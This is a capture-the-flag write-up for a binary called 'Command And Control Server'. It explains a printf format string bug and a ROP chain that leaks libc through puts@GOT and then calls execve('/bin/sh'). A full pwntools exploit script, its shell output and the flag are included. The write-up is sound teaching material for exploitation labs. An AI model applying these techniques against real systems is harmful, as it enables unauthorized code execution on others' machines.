# Command And Control Server - Writeup

---

## Challenge Summary

The `Command And Control Server` binary simulates a mock C2 interface that accepts a "callsign" (username) and a subsequent payload. The program is vulnerable to a **format string vulnerability**, allowing for **arbitrary memory writes**. Leveraging this, we overwrite the username with `"/bin/sh"`, leak `puts@GOT`, calculate the libc base, and finally perform a **ret2libc** to spawn a shell.

---

## Binary Information

```bash
$ file main
```

![Alt text](img/1.png)

```bash
$ checksec main

```

![Alt text](img/2.png)

## Static Analysis

### Vulnerable Code

```c
printf(">> Welcome Commander: ");
printf(buf);  // Format string vulnerability
```

![Alt text](img/3.png)

- The `printf(buf)` line introduces a **format string vulnerability**.
- The `read(0, buf, 0xC8)` provides a generous buffer size.
- The buffer `buf[208]` is large enough for format string payloads.
- The binary has **NX enabled**, so we can't inject and jump to shellcode.
- However, it does not use a stack canary, and with **PIE enabled**, we must leak memory to compute addresses.

---

## Exploit Strategy

### Step 1: Leak Username Address

The binary prints a memory address used as the base to calculate the location of the `username` buffer (via a leaked "Auth Token"). This allows us to:

- Leak the PIE base from the `username` pointer.
- Calculate the address we want to overwrite using the format string.

### Step 2: Format String Exploit

We overwrite the `username` buffer with the string `"/bin/sh\x00"` using `fmtstr_payload`. This is necessary for the `execve("/bin/sh", 0, 0)` syscall later.

### Step 3: Leak libc via puts\@got

We send a ROP chain that calls `puts(puts@got)` and returns to `main`. This gives us:

- The runtime address of `puts`.
- The ability to compute the **libc base** using the known offset of `puts` in libc.

### Step 4: ret2libc — Spawning a Shell

After obtaining the libc base:

- We craft a syscall ROP chain to execute `execve("/bin/sh", NULL, NULL)` using `username_ptr` as the `/bin/sh` pointer.

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('main')
libc = ELF('libc.so.6')  # Ensure you’re using the matching libc version

def start():
    return process([exe.path])

io = start()

# Step 1: Leak username pointer & calculate PIE base
io.recvuntil(b">> Auth Token = ")
username_ptr = int(io.recvline().strip(), 16)
exe.address = username_ptr - exe.sym['username']
log.success(f"username @ {hex(username_ptr)}")
log.success(f"PIE base @ {hex(exe.address)}")

# Step 2: Format String to Write "/bin/sh"
io.recvuntil(b">> [C2] Enter your callsign to proceed:")
payload = fmtstr_payload(6, {username_ptr: u64(b"/bin/sh\x00")})
io.sendline(payload)

# Step 3: Leak puts@got using ROP
io.recvuntil(b">> [C2] Access granted. Standby for remote operation sequence...")

rop = ROP(exe)
rop.call(exe.plt['puts'], [exe.got['puts']])
rop.call(exe.sym['main'])

payload = b"A" * 88
payload += rop.chain()
io.sendline(payload)

# Read and parse puts leak
for _ in range(4): io.recvline()
leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.sym['puts']
log.success(f"Leaked puts: {hex(leaked_puts)}")
log.success(f"libc base: {hex(libc.address)}")

# Step 4: ret2libc to execve("/bin/sh", NULL, NULL)
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]

payload = b"A" * 88
payload += p64(pop_rdi) + p64(username_ptr)
payload += p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)

io.sendline(payload)
io.interactive()
```

---

## Exploit Output

```text
$ ./exploit.py
[+] Starting local process './main': pid 1234
[*] Leaked puts: 0x7fbb12345678
[*] libc base: 0x7fbb12000000
[*] Switching to interactive mode
$ whoami
ctfplayer
$ cat flag.txt
RedPointer{FhoijKey_Not_Encrypted_flag_afagsgijq}
```

---

## Vulnerability Summary

| Protection   | Status      |
| ------------ | ----------- |
| RELRO        | Full RELRO  |
| Stack Canary | Not Present |
| NX           | Enabled     |
| PIE          | Enabled     |
| Stripped     | No          |

- Format string vulnerability enables arbitrary write
- ROP used to leak libc and execute a syscall chain
- Final payload uses ret2libc to run `/bin/sh`

---

## Flag

```
RedPointer{FhoijKey_Not_Encrypted_flag_afagsgijq}
```

---

Let me know if you want to add a **Reverse Engineering section**, **GDB insights**, or visuals like **call flow diagrams or memory layout maps**.
